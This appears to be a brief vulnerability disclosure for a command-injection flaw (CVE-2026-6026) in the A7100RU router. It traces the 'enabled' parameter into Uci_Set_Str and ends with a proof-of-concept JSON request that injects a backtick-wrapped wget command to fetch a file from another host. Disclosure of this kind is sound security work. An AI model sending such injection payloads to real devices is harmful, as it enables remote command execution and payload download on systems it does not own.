# A7100RU Vulnerability（CVE-2026-6026）
...
In  sub_423704 function, it reads in a user-provided parameter `enabled` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `enabled` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setPortalConfWeChat","enabled":"`wget 192.168.6.1:7777/testpoc`"
